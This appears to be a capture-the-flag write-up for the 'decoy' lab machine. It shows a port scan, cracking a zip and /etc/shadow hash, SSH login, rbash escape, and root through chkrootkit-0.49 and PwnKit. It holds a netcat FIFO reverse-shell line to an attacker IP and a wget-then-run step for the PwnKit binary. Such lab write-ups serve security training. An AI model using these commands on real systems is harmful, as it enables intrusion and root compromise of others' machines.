@@ -1,0 +1,233 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>README.md</title>
+</head><body>IP - 10.0.2.52<br/>
+<br/>
+john2zip<br/>
+john<br/>
+rbash escape with ssh<br/>
+chkrootkit-0.49 (Priv Escalation)<br/>
+PwnKit (Priv Escalation)<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+nmap result<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/decoy]<br/>
+└─# nmap -sC -sV 10.0.2.52 -p- -oN nmap_all_port.txt<br/>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-10 02:41 +0630<br/>
+Nmap scan report for 10.0.2.52<br/>
+Host is up (0.00011s latency).<br/>
+Not shown: 65533 closed tcp ports (reset)<br/>
+PORT &nbsp; STATE SERVICE VERSION<br/>
+22/tcp open &nbsp;ssh &nbsp; &nbsp; OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br/>
+| ssh-hostkey: <br/>
+| &nbsp; 2048 a9b53e3be374e4ffb6d59ff181e7a44f (RSA)<br/>
+| &nbsp; 256 cef3b3e70e90e264ac8d870f1588aa5f (ECDSA)<br/>
+|_ &nbsp;256 66a98091f3d84b0a69b000229f3c4c5a (ED25519)<br/>
+80/tcp open &nbsp;http &nbsp; &nbsp;Apache httpd 2.4.38<br/>
+|_http-title: Index of /<br/>
+| http-ls: Volume /<br/>
+| SIZE &nbsp;TIME &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;FILENAME<br/>
+| 3.0K &nbsp;2020-07-07 16:36 &nbsp;save.zip<br/>
+|_<br/>
+|_http-server-header: Apache/2.4.38 (Debian)<br/>
+MAC Address: 08:00:27:65:36:0A (Oracle VirtualBox virtual NIC)<br/>
+Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br/>
+<br/>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>
+Nmap done: 1 IP address (1 host up) scanned in 9.04 seconds<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+I got save.zip from web app home page. I downloaded it and tried to unzip but it protected with password so I need to crack the password with zip2john and john<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/decoy]<br/>
+└─# zip2john save.zip &gt; save_zip_hash<br/>
+ver 2.0 efh 5455 efh 7875 save.zip/etc/passwd PKZIP Encr: TS_chk, cmplen=668, decmplen=1807, crc=B3ACDAFE ts=90AB cs=90ab type=8<br/>
+ver 2.0 efh 5455 efh 7875 save.zip/etc/shadow PKZIP Encr: TS_chk, cmplen=434, decmplen=1111, crc=E11EC139 ts=834F cs=834f type=8<br/>
+ver 2.0 efh 5455 efh 7875 save.zip/etc/group PKZIP Encr: TS_chk, cmplen=460, decmplen=829, crc=A1F81C08 ts=8D07 cs=8d07 type=8<br/>
+ver 2.0 efh 5455 efh 7875 save.zip/etc/sudoers PKZIP Encr: TS_chk, cmplen=368, decmplen=669, crc=FF05389F ts=1535 cs=1535 type=8<br/>
+ver 2.0 efh 5455 efh 7875 save.zip/etc/hosts PKZIP Encr: TS_chk, cmplen=140, decmplen=185, crc=DFB905CD ts=8759 cs=8759 type=8<br/>
+ver 1.0 efh 5455 efh 7875 ** 2b ** save.zip/etc/hostname PKZIP Encr: TS_chk, cmplen=45, decmplen=33, crc=D9C379A9 ts=8CE8 cs=8ce8 type=0<br/>
+NOTE: It is assumed that all files in each archive have the same password.<br/>
+If that is not the case, the hash may be uncrackable. To avoid this, use<br/>
+option -o to pick a file at a time.<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/decoy]<br/>
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt save_zip_hash <br/>
+Using default input encoding: UTF-8<br/>
+Loaded 1 password hash (PKZIP [32/64])<br/>
+Will run 4 OpenMP threads<br/>
+Press 'q' or Ctrl-C to abort, almost any other key for status<br/>
+manuel &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (save.zip) &nbsp; &nbsp; <br/>
+1g 0:00:00:00 DONE (2023-03-10 02:45) 10.00g/s 81920p/s 81920c/s 81920C/s 123456..whitetiger<br/>
+Use the "--show" option to display all of the cracked passwords reliably<br/>
+Session completed.<br/>
+<br/>
+Got password "manuel".<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+After extracted the save.zip, I got 5 files included /etc/passwd and /etc/shadow file so I read /etc/shadow file and got unix_crypt password for user "296640a3b825115a47b68fc44501c828".<br/>
+<br/>
+So, I crack the hash with "john" again<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/decoy]<br/>
+└─# nano unix_hash &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/decoy]<br/>
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt unix_hash &nbsp; <br/>
+Using default input encoding: UTF-8<br/>
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])<br/>
+Cost 1 (iteration count) is 5000 for all loaded hashes<br/>
+Will run 4 OpenMP threads<br/>
+Press 'q' or Ctrl-C to abort, almost any other key for status<br/>
+server &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (?) &nbsp; &nbsp; <br/>
+1g 0:00:00:03 DONE (2023-03-10 02:48) 0.2816g/s 4903p/s 4903c/s 4903C/s felton..petey<br/>
+Use the "--show" option to display all of the cracked passwords reliably<br/>
+Session completed.<br/>
+<br/>
+Got password "server"<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+User Access (via ssh)<br/>
+<br/>
+username - 296640a3b825115a47b68fc44501c828<br/>
+password - server<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# ssh 296640a3b825115a47b68fc44501c828@10.0.2.52<br/>
+The authenticity of host '10.0.2.52 (10.0.2.52)' can't be established.<br/>
+ED25519 key fingerprint is SHA256:qzYkm7MeglkL3QtA6bU4nv7yc8jlb1x7fZ7ALPBohNQ.<br/>
+This key is not known by any other names<br/>
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br/>
+Warning: Permanently added '10.0.2.52' (ED25519) to the list of known hosts.<br/>
+296640a3b825115a47b68fc44501c828@10.0.2.52's password: <br/>
+Linux 60832e9f188106ec5bcc4eb7709ce592 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64<br/>
+<br/>
+The programs included with the Debian GNU/Linux system are free software;<br/>
+the exact distribution terms for each program are described in the<br/>
+individual files in /usr/share/doc/*/copyright.<br/>
+<br/>
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br/>
+permitted by applicable law.<br/>
+Last login: Tue Jul &nbsp;7 16:45:50 2020 from 192.168.1.162<br/>
+-rbash: dircolors: command not found<br/>
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+rbash bypass (https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/)<br/>
+<br/>
+I escape the rbash with this one:<br/>
+<br/>
+ssh 296640a3b825115a47b68fc44501c828@10.0.2.52 -t "bash -i" &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+296640a3b825115a47b68fc44501c828@10.0.2.52's password: <br/>
+bash: dircolors: command not found<br/>
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ echo $0<br/>
+bash<br/>
+<br/>
+And then export /bin into PATH:<br/>
+<br/>
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ export PATH=/bin:$PATH<br/>
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ echo $PATH<br/>
+/bin:PATH:/home/296640a3b825115a47b68fc44501c828/<br/>
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ cat user.txt <br/>
+35253d886842075b2c6390f35946e41f<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Priv Escalation (chkrootkit-0.49)<br/>
+<br/>
+I found suspicious log files from "~/SV-502/logs" and found "chkrootkit-0.49" will run automatically every 2 or 3 minutes and also found this rootkit is vulnerable into locat priv escalation:<br/>
+<br/>
+2020/06/27 18:56:58 CMD: UID=0 &nbsp; &nbsp;PID=12385 &nbsp;| -bash <br/>
+2020/06/27 18:56:58 CMD: UID=0 &nbsp; &nbsp;PID=12386 &nbsp;| tar -xvzf chkrootkit-0.49.tar.gz<br/>
+<br/>
+https://www.exploit-db.com/exploits/33899<br/>
+<br/>
+Step 1:<br/>
+<br/>
+Add reverse shell command into "update" that will create in /tmp<br/>
+<br/>
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.0.2.4 5555 &gt;/tmp/f" &gt; update<br/>
+<br/>
+Step 2:<br/>
+<br/>
+Give permission<br/>
+<br/>
+chmod +x update<br/>
+<br/>
+Step 3:<br/>
+<br/>
+Linsten with netcat and wait a few minute and then you will get access as root:<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# nc -lvnp 5555<br/>
+listening on [any] 5555 ...<br/>
+connect to [10.0.2.4] from (UNKNOWN) [10.0.2.52] 32936<br/>
+sh: 0: can't access tty; job control turned off<br/>
+# whoami<br/>
+root<br/>
+<br/>
+<br/>
+root@60832e9f188106ec5bcc4eb7709ce592:~# cat root.txt <br/>
+&nbsp; ........::::::::::::.. &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; .......|...............::::::::........<br/>
+&nbsp; &nbsp; &nbsp;.:::::;;;;;;;;;;;:::::.... . &nbsp; &nbsp; \ &nbsp; | ../....::::;;;;:::::.......<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;. &nbsp; &nbsp; &nbsp; ........... &nbsp; / \\_ &nbsp; \ &nbsp;| &nbsp;/ &nbsp; &nbsp; ...... &nbsp;. &nbsp; &nbsp; ........./\<br/>
+...:::../\\_ &nbsp;...... &nbsp; &nbsp; ..._/' &nbsp; \\\_ &nbsp;\###/ &nbsp; /\_ &nbsp; &nbsp;.../ \_....... &nbsp; _//<br/>
+.::::./ &nbsp; \\\ _ &nbsp; .../\ &nbsp; &nbsp;/' &nbsp; &nbsp; &nbsp;\\\\#######// &nbsp; \/\ &nbsp; // &nbsp; \_ &nbsp; ....////<br/>
+&nbsp; &nbsp; _/ &nbsp; &nbsp; &nbsp;\\\\ &nbsp; _/ \\\ / &nbsp;x &nbsp; &nbsp; &nbsp; \\\\###//// &nbsp; &nbsp; &nbsp;\//// &nbsp; &nbsp; \__ &nbsp;_/////<br/>
+&nbsp; ./ &nbsp; x &nbsp; &nbsp; &nbsp; \\\/ &nbsp; &nbsp; \/ x X &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \////// &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \/////<br/>
+&nbsp;/ &nbsp; &nbsp; XxX &nbsp; &nbsp; \\/ &nbsp; &nbsp; &nbsp; &nbsp; XxX X &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;//// &nbsp; x<br/>
+-----XxX-------------|-------XxX-----------*--------|---*-----|------------X--<br/>
+&nbsp; &nbsp; &nbsp; &nbsp;X &nbsp; &nbsp; &nbsp; &nbsp;_X &nbsp; &nbsp; &nbsp;* &nbsp; &nbsp;X &nbsp; &nbsp; &nbsp;** &nbsp; &nbsp; &nbsp; &nbsp; ** &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; x &nbsp; ** &nbsp; &nbsp;* &nbsp;X<br/>
+&nbsp; &nbsp; &nbsp; _X &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;_X &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; x &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;x &nbsp; &nbsp; X_<br/>
+<br/>
+<br/>
+1c203242ab4b4509233ca210d50d2cc5<br/>
+<br/>
+Thanks for playing! - Felipe Winsnes (@whitecr0wz)<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Another Way To Priv Escalation (PwnKit (kernel exploit))<br/>
+<br/>
+This machine is also vulnerable into PwnKit Local Priv Escalation exploit<br/>
+<br/>
+From My Machine:<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/tools/Pwnkit]<br/>
+└─# python2 -m SimpleHTTPServer 80<br/>
+Serving HTTP on 0.0.0.0 port 80 ...<br/>
+10.0.2.52 - - [10/Mar/2023 04:20:41] "GET /PwnKit HTTP/1.1" 200 -<br/>
+<br/>
+From Victim Machine:<br/>
+<br/>
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ wget http://10.0.2.4/PwnKit<br/>
+--2023-03-09 16:50:42-- &nbsp;http://10.0.2.4/PwnKit<br/>
+Connecting to 10.0.2.4:80... connected.<br/>
+HTTP request sent, awaiting response... 200 OK<br/>
+Length: 16800 (16K) [application/octet-stream]<br/>
+Saving to: ‘PwnKit’<br/>
+<br/>
+PwnKit &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;100%[==================================================================&gt;] &nbsp;16.41K &nbsp;--.-KB/s &nbsp; &nbsp;in 0.008s &nbsp;<br/>
+<br/>
+2023-03-09 16:50:42 (1.89 MB/s) - ‘PwnKit’ saved [16800/16800]<br/>
+<br/>
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ chmod +x PwnKit <br/>
+296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:/tmp$ ./PwnKit <br/>
+root@60832e9f188106ec5bcc4eb7709ce592:/tmp#<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------------------------------------------------<br/>
+Offensive Security Playground Lab Flags<br/>
+<br/>
+root@60832e9f188106ec5bcc4eb7709ce592:~# cat proof.txt <br/>
+ffcb277aac8aa94015ac0c83e2884ed4<br/>
+<br/>
+root@60832e9f188106ec5bcc4eb7709ce592:/home/296640a3b825115a47b68fc44501c828# cat local.txt <br/>
+5865749e19ba530ff5844c243caaec96</body></html>
